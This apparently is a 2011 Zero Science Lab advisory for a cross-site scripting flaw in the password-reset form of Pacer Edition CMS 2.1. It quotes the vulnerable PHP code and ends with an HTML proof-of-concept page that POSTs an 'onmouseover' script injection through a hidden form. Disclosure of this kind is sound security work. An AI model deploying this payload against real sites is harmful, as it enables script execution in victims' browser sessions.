@@ -1,0 +1,70 @@
+<!--
+
+
+Pacer Edition CMS 2.1 Remote XSS POST Injection Vulnerability
+
+Vendor: The Pacer Edition
+Product web page: http://www.thepaceredition.com
+Affected version: RC 2.1 (SVN: 867)
+
+Summary: The 'Pacer Edition' is a Content Management System(CMS)
+written using PHP 5.2.9 as a minimum requirement. The Pacer Edition
+CMS was based from Website baker core and has been completely
+redesigned with a whole new look and feel along with many new
+advanced features to allow you to build sites exactly how you want
+and make them, 100% yours!
+
+Desc: Pacer Edition CMS suffers from a XSS vulnerability when parsing
+user input to the 'email' parameter via POST method in 'admin/login/forgot/index.php'.
+Attackers can exploit this weakness to execute arbitrary HTML and script
+code in a user's browser session.
+
+
+/admin/login/forgot/index.php (line: 77-83):
+----------------------------------------------------------------
+if(isset($_POST['email']) AND $_POST['email'] != "") {
+
+	$email = $_POST['email'];
+
+	// Check if the email exists in the database
+	$query = "SELECT user_id,username,display_name,email,last_reset,password FROM ".TABLE_PREFIX."users WHERE email = '".$admin->add_slashes($_POST['email'])."'";
+	$results = $database->query($query);
+----------------------------------------------------------------
+
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Apache 2.2.14 (Win32)
+           PHP 5.3.1
+           MySQL 5.1.41
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            liquidworm gmail com
+                            Zero Science Lab
+
+
+Advisory ID: ZSL-2011-5018
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5018.php
+
+
+
+07.06.2011
+
+
+-->
+
+
+
+<html>
+<title>Pacer Edition CMS 2.1 Remote XSS POST Injection Vulnerability</title>
+<body bgcolor="#1C1C1C">
+<script type="text/javascript">function xss1(){document.forms["xss"].submit();}</script>
+<form action="http://192.168.16.101/admin/login/forgot/index.php" enctype="application/x-www-form-urlencoded" method="POST" id="xss">
+<input type="hidden" name="url" value="1" />
+<input type="hidden" name="email" value='%F6"+onmouseover=prompt(31337)' />
+<input type="hidden" name="button" value="Send%20Details" />
+</form>
+<a href="javascript: xss1();" style="text-decoration:none">
+<b><font color="red"><center><h3><br /><br />Exploit!<h3></center></font></b></a>
+</body>
+</html>
